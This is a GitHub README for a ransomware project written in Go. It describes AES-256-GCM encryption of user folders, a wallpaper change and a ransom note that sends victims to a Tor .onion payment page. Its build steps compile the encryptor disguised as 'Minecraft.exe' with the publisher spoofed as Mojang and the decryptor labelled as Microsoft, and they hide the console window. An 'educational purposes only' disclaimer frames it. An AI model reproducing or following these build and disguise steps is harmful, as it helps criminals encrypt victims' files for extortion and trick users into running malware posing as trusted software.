# Ransomware Project

## 📜 Overview
This project is a ransomware written in **Go** (Golang), designed to encrypt files using **AES-256 encryption**


### ⚠️ Disclaimer
This project is intended for **educational purposes only** to help understand the mechanisms of ransomwares. Misuse of this code for malicious purposes is illegal and unethical. Use responsibly.


## 🚀 Features
1. **File Encryption with AES-256**
   - Encrypts all files in target directories using the Advanced Encryption Standard with a 256-bit key.

2. **Desktop Background Change**
   - Automatically changes the victim's desktop wallpaper to a custom image.

3. **Ransom Note Generation**
   - Creates a text file with details on:
     - Instructions to download and install Tor Browser.
     - Navigating to a specific .onion site for payment and decryption software.


## 🔧 Technical Details
### File Encryption
- **Algorithm:** AES-256 in GCM mode
- **Key Handling:** A unique key is generated for each instance, stored securely for decryption upon payment.
- **Targets:** Recursively scans and encrypts files in user-defined directories (e.g., `/home/user` on Linux or `C:\Users` on Windows).
- **Exclusions:** Skips not important folders and critical system files to avoid rendering the machine unbootable.

### Desktop Background Change
- Replaces the victim's current wallpaper with a custom image provided in the payload.

### Ransom Note
- Automatically generates a file named `READ_ME.txt` or equivalent in Desktop
- Includes:
  - Steps to download Tor Browser.
  - The onion URL for the ransom page (with instructions for payment and decryption)

### Written in Go
- **Why Go?**
  - Cross-platform compatibility.
  - Strong support for concurrency and networking.
  - Lightweight binaries for easier distribution.


## 🛠️ Installation & Usage
### Prerequisites
- **Go (Golang):** Install the Go compiler from [golang.org](https://golang.org).
- **Dependencies:**
  - Standard Go libraries.
  - To change background (multi-platform): https://github.com/reujab/wallpaper (```go get -u github.com/reujab/wallpaper```)
- **External Tools:**
 - To change the software icon in Windows: https://github.com/tc-hib/go-winres (```go install github.com/tc-hib/go-winres@latest```)
   ```bash 
   go-winres simply --icon icon.png
   go build
   ```

### Build Instructions
1. Clone the repository:
   ```bash
   git clone https://github.com/CyberCactus64/under-ware.git
   cd ransomware-project
   ```
2. Build the encryptor:
   ```bash
   cd underware
   go build -ldflags="-H windowsgui" -o encryptor.exe
   go build -ldflags="-H windowsgui" -ldflags "-X main.Publisher=Mojang" -o Minecraft.exe
   ```
2. Build the decryptor:
   ```bash
   cd underware-savior
   go build -ldflags="-H windowsgui" -ldflags "-X main.Publisher=Microsoft" -o HelpMe.exe
   ```


## 🛡️ Legal and Ethical Use
This project must only be used for **research** and **cybersecurity training**. Unauthorized deployment of this program is strictly prohibited and punishable under applicable laws.

---

### 📫 Contact
For questions or collaborations, please reach out to:
- Email: edoardo.enricomaria.fornasier@gmail.com
- GitHub: [your_username](https://github.com/CyberCactus64)

---

**Stay ethical and use this code responsibly!**
